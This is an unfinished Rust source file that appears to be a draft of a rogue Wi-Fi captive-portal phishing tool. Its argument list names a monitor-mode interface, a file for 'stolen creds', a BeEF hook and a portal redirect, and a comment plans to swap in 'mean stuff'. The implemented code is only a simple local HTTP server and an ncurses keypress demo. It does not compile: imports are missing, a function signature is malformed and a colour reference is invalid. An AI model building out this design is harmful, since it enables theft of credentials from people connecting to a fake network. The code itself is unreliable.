/*
Total conversion of the project to Rust
*/

//Basic stuff
use std::char;
use std::thread;
use std::time::Duration;
use std::io::{self, Write};
use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};

//Ncurses
extern crate ncurses;
use ncurses::*;


//Network stuff
use std::net::TcpListener;
use std::io::prelude::*;
use std::net::TcpStream;

/*HTML for the login*/
//Add beef hook conditional to replace normal stuff with mean stuff
/*
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hello!</title>
  </head>
  <body>
    <h1>Hello!</h1>
    <p>Hi from Rust</p>
  </body>
</html>
*/

/* Bad request response*/
// add stuff here
/*
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hello!</title>
  </head>
  <body>
    <h1>Oops!</h1>
    <p>Sorry, I don't know what you're asking for.</p>
  </body>
</html>
*/





fn parse_commandline_arguments(){

    let args: Vec<String> = env::args().collect();
    let help          = &args[1];    // Shows the help
    let ADDRESS       = &args[2];    // IP address to use for server
    let PORT          = &args[3];    // port to use
    let INTERFACE     = &args[4];    // interface to use in monitor mode
    let CREDENTIALS   = &args[5];    // filename to save stolen creds to
    let DOCUMENT_ROOT = &args[6];    // doc root of server
    let EXTERNAL_HTML = &args[7];    //bool switch for serving external document instead of internal form
    let BEEF_HOOK     = &args[8];    // switch for beef hook
    let PORTAL        = &args[9];      // Trigger to actually implement the redirect
    let TBD           = &args[10];    // TO BE DECIDED

}

// add an error logger HERE maybe?
fn termcolorprint(text_color, text ) -> io::Result<()> {
    let mut stdout = StandardStream::stdout(ColorChoice::Always);
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::text_color)))?;
    writeln!(&mut stdout, text)
};

// add conditional to use ncurses output
fn shutdown_server(){
    termcolorprint( "red", "SHUTTING DOWN");
    update_window(stdscr, message);
    refresh();
};

/* Setup http responder*/
fn setup_listener(){
    let listener = TcpListener::bind("127.0.0.1:80").unwrap();
    for stream in listener.incoming() {
        let stream = stream.unwrap();
        // Spawn a new thread for every connection
        // add code to limit threads
        thread::spawn(|| {
            handle_connection(stream);
        });
    }
}

// server handler
fn handle_connection(mut stream: TcpStream) {
    
    /*Request listener*/ 
    let mut buffer = [0; 512];
    stream.read(&mut buffer).unwrap();
    println!("Request: {}", String::from_utf8_lossy(&buffer[..]));

    let get = b"GET / HTTP/1.1\r\n";
    /* Signal responder*/
        // if its a good request
    if buffer.starts_with(get) {
        let contents = fs::read_to_string("hello.html").unwrap();
        let response = format!("HTTP/1.1 200 OK\r\n\r\n{}", contents);
        stream.write(response.as_bytes()).unwrap();
        stream.flush().unwrap();
        // if its a bad request
    } else {
        let status_line = "HTTP/1.1 404 NOT FOUND\r\n\r\n";
        let contents = fs::read_to_string("404.html").unwrap();
        let response = format!("{}{}", status_line, contents);
        stream.write(response.as_bytes()).unwrap();
        stream.flush().unwrap();
    }

}

fn main()
{
  /* Setup ncurses. */
  initscr();
  raw();

  /* Allow for extended keyboard (like F1). */
  keypad(stdscr(), true);
  noecho();

  /* Prompt for a character. */
  printw("Enter a character: ");

  /* Wait for input. */
  let ch = getch();
  if ch == KEY_F1
  {
    /* Enable attributes and output message. */
    attron(A_BOLD() | A_BLINK());
    printw("\nF1");
    attroff(A_BOLD() | A_BLINK());
    printw(" pressed");
  }
  else
  {
    /* Enable attributes and output message. */
    printw("\nKey pressed: ");
    attron(A_BOLD() | A_BLINK());
    printw(format!("{}\n", char::from_u32(ch as u32).expect("Invalid char")).as_ref());
    attroff(A_BOLD() | A_BLINK());
  }

  /* Refresh, showing the previous message. */
  refresh();

  /* Wait for one more character before exiting. */
  getch();
  endwin();
}